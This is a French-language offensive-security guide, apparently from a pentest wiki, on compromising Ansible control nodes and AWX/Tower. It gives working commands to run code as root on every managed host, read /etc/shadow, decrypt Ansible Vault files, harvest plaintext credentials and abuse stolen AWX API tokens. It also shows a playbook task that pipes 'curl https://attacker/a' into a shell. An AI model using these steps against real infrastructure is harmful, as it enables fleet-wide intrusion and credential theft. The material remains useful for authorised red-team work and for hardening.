---
title: "Ansible : abuser du nœud de contrôle et d'AWX pour l'exécution de code à l'échelle du parc"
description: "Attaquer Ansible : compromettre le nœud de contrôle pour exécuter des modules en tant que root sur tout l'inventaire via SSH, déchiffrer les secrets Ansible Vault et lire les identifiants de connexion en clair, injecter dans les playbooks et les rôles du dépôt de contrôle, et abuser des identifiants stockés et des modèles de tâches AWX/Tower."
keywords:
  - Ansible
  - ansible control node
  - ansible vault
  - AWX
  - Tower
---

# Ansible

Ansible est sans agent : un nœud de contrôle se connecte à chaque hôte de l'inventaire via SSH (ou WinRM) et y exécute des modules en tant qu'utilisateur de connexion, en escaladant avec `become` jusqu'à root. Quiconque contrôle le nœud de contrôle, ou les playbooks qu'il exécute, ou les identifiants qu'il détient, dispose donc d'une exécution de code en tant que root sur chaque hôte géré. Il n'y a pas d'agent à compromettre ; le levier est le nœud de contrôle et les secrets qui l'entourent.

## Trouver le nœud de contrôle et son inventaire

```bash
which ansible ansible-playbook                      # control-node binaries
ls -la /etc/ansible/ ~/.ansible/ ./ansible.cfg      # config, inventory, roles
grep -rniE 'ansible_(ssh_)?pass|ansible_user|become_pass|vault_password_file' . /etc/ansible 2>/dev/null
```

`ansible.cfg` nomme l'inventaire, le `vault_password_file` et le `private_key_file` ; l'inventaire porte souvent des identifiants de connexion en clair.

## Exécuter des commandes sur tout le parc

Avec les clés SSH et l'inventaire du nœud de contrôle, une seule commande ad hoc s'exécute partout en tant que root :

```bash
ansible all -i inventory -m command -a 'id' --become   # root on every reachable host
ansible all -i inventory -m shell -a 'cat /etc/shadow' -b
```

Les clés privées SSH que le nœud de contrôle utilise pour atteindre les hôtes (`~/.ssh/`, le `private_key_file`) sont elles-mêmes du matériel de déplacement latéral, même sans Ansible.

## Déchiffrer les secrets Vault et lire les identifiants en clair

Ansible Vault chiffre les fichiers secrets, mais le mot de passe du vault est fréquemment stocké sur le disque ou dans une variable CI, et `ansible.cfg` pointe directement dessus :

```bash
grep vault_password_file ansible.cfg                 # path to the key that decrypts everything
ansible-vault view group_vars/all/secrets.yml --vault-password-file .vault_pass
```

Les inventaires et les `group_vars`/`host_vars` contiennent aussi `ansible_password`, `ansible_ssh_pass` et `ansible_become_password` en clair lorsque Vault n'a pas été utilisé, qui sont des identifiants directement réutilisables.

## Injecter dans les playbooks et les rôles

Les playbooks et les rôles sont du code, généralement dans un dépôt Git que le nœud de contrôle ou une tâche CI exécute selon un planning. Une tâche ajoutée à un playbook, à un rôle ou à une dépendance Galaxy/`requirements.yml` tirée s'exécute partout où ce play cible :

```yaml
- hosts: all
  become: true
  tasks:
    - name: x
      command: /bin/sh -c "curl -s https://attacker/a | sh"
```

L'accès en écriture au dépôt de contrôle équivaut à une exécution de code à l'échelle du parc à la prochaine exécution ; voir [versioning](../versioning/git/hooks-and-config-execution.md) pour transformer l'accès au dépôt en cet accès en écriture.

## AWX et Tower

AWX (et sa version commerciale Tower/Controller) est la plateforme web autour d'Ansible. Elle stocke les **identifiants** machine, vault et cloud chiffrés avec la `SECRET_KEY` de l'instance, et ses **modèles de tâches** exécutent des playbooks arbitraires contre des inventaires à la demande ou selon un planning.

```bash
# API with a stolen token: list credentials and launch a job template
curl -sk -H "Authorization: Bearer $TOKEN" https://awx/api/v2/credentials/ | jq '.results[].name'
curl -sk -H "Authorization: Bearer $TOKEN" -X POST https://awx/api/v2/job_templates/<id>/launch/
```

Une session administrateur (identifiants `admin` par défaut, failles SSO ou jeton divulgué) vous permet de lancer un modèle, d'en ajouter un malveillant, ou d'utiliser un identifiant stocké dans une tâche qui l'affiche ou l'exfiltre ; l'API ne retourne jamais directement les valeurs secrètes. Un point d'ancrage sur l'hôte AWX avec la base de données et la `SECRET_KEY` déchiffre tous les identifiants stockés hors ligne. Dans les deux cas, le gain est l'exécution de code sur les hôtes cibles des modèles avec leurs identifiants stockés.

## Suite

Le nœud de contrôle donne root sur chaque hôte géré en même temps, et les clés SSH, les secrets Vault et les identifiants AWX récoltés étendent cela à des systèmes qu'Ansible ne gère même pas. À partir de là, pivotez vers l'annuaire et les comptes cloud que ces identifiants déverrouillent.

## Outils

- `ansible`, `ansible-vault` : exécuter des commandes ad hoc et déchiffrer les fichiers Vault avec la clé récupérée.
- `jq` avec l'API REST AWX pour l'énumération des identifiants et des modèles de tâches.

## Références

- [Ansible become (élévation de privilèges)](https://docs.ansible.com/ansible/latest/playbook_guide/become.html)
- [Ansible Vault](https://docs.ansible.com/ansible/latest/vault_guide/index.html)
- [API REST AWX](https://ansible.readthedocs.io/projects/awx/en/latest/rest_api/index.html)
